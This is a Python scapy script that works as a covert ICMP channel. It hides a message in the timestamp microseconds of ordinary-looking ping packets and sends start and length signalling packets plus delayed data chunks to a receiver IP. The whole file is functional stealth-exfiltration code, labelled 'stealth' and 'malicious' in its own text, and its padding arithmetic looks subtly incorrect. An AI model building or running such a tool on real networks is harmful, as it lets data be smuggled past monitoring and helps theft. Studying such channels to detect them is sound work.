from scapy.all import IP, ICMP, sr1
import time
import struct
import math
import argparse
import random

parser = argparse.ArgumentParser(description="ICMP traffic stealth sender for secret messages.")
parser.add_argument("-m", "--message", required=True, help="Message that need to be sent!")
parser.add_argument("-d", "--destination", required=True, help="The ip address of the receiver machine.")
parser.add_argument("-t", "--time_delay", required=False, default=1, help="Delay time between packets in seconds.")
args = parser.parse_args()

def build_ping_packet(dst_ip, identifier, sequence_number, chunk):
    now = time.time()
    seconds = int(now)
    microseconds = int((now - seconds) * 1_000_000)
    microseconds_hex = hex(microseconds)[2:-4] + chunk
    malicious_mircoseconds = int(microseconds_hex, 16)

    timestamp = struct.pack('QQ', seconds, malicious_mircoseconds)
    pattern = bytes(range(0x10, 0x10 + 40))
    payload = timestamp + pattern
    packet = IP(dst=dst_ip)/ICMP(id=identifier, seq=sequence_number)/payload

    return packet

def ping_start_pattern(): #3 pattern packet
    for i in range(3):
        first_num = random.randint(4, 255)
        second_num = first_num ** 2
        pattern = f"{first_num:02x}{hex(second_num)[-2:]}"
        pkt = build_ping_packet(target, icmp_id, i, pattern)
        response = sr1(pkt, timeout = 2, verbose = 0)
        if response:
            print(f"Received response for the pattern packet number {i + 1}")
        time.sleep(sleep_time)

def ping_length_pattern():
    number_of_data_packet = math.ceil(len(secretText_hex)/4)
    for i in range(2):
        mid = random.randint(0, number_of_data_packet)
        first_byte, second_byte = f"{mid:02x}", f"{number_of_data_packet - mid:02x}"
        pkt = build_ping_packet(target, icmp_id, i, f"{first_byte}{second_byte}")
        response = sr1(pkt, timeout = 2, verbose = 0)
        if response:
            print(f"Received response for length patter packet number {i + 1}")
        time.sleep(sleep_time)

if __name__ == "__main__":
    # Target IP address
    target = args.destination

    sleep_time = float(args.time_delay)

    # Example ID and Sequence
    icmp_id = 3417
    icmp_seq = 0

    secretText = args.message
    secretText_hex = secretText.encode('utf-8').hex()
    secretText_hex =  secretText_hex + "0" * (len(secretText_hex) % 4)

    ping_start_pattern()

    ping_length_pattern()

    #send actual data
    for i in range(0, len(secretText_hex) - 1, 4):
        chunk = secretText_hex[i:i+4] 
        # Build packet
        icmp_seq += 1   
        pkt = build_ping_packet(target, icmp_id, icmp_seq, chunk)
        # Send packet
        response = sr1(pkt, timeout = 2, verbose = 0)
        if response:
            print(f"Received response for icmp_seq {icmp_seq} from {response.src}")
        else:
            print("No response received (timeout)")
        time.sleep(sleep_time)